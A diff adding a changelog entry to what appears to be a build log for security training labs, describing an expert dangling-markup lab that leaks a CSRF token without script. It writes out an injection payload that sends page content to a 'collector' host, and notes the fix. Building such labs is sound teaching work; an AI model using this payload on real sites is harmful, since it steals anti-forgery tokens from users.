@@ -215,6 +215,19 @@ A scriptless exfil lab. Built by hand, prototyped + Docker-verified live; Flask 
 Reuses the batch-a shape; `risk: low`. Integrity: `/preview` 403, CSP `script-src 'none'` (CSS is the only
 exfil), leak is char-by-char. XSS 20/26 after merge.
 
+### batch/track-xss-l-dangling (this batch — scriptless dangling-markup exfil, expert)
+
+Prototyped in real Chromium 131 first; built by hand, Docker-verified live; Flask (re-platformed Go/Echo).
+
+- `dangling-markup-csrf-token-exfil` (**expert**) — `/page?u=` reflects `u` RAW into an UNQUOTED attribute on a
+  single-line template, CSP `script-src 'none'`. Injecting `x><img src='http://collector:9000/leak?d=` leaves a
+  dangling single-quoted `src` that swallows the source line (incl. the hidden CSRF token) to the collector —
+  no script. Fix: encode + quote the reflection. (Chrome's dangling-markup mitigation blocks newline-crossing
+  URLs, so the token must sit on the same source line — verified live.)
+
+Reuses the batch-a shape; `risk: low`. Integrity: `/page` 403, a terminated `<img>` leaks no token, wrong token
+rejected. XSS 21/26 after merge.
+
 ## Scheduled (from `data/catalog.json`)
 
 Reflected (done: 1) → stored → DOM → filter-ladder/sanitiser bypass →
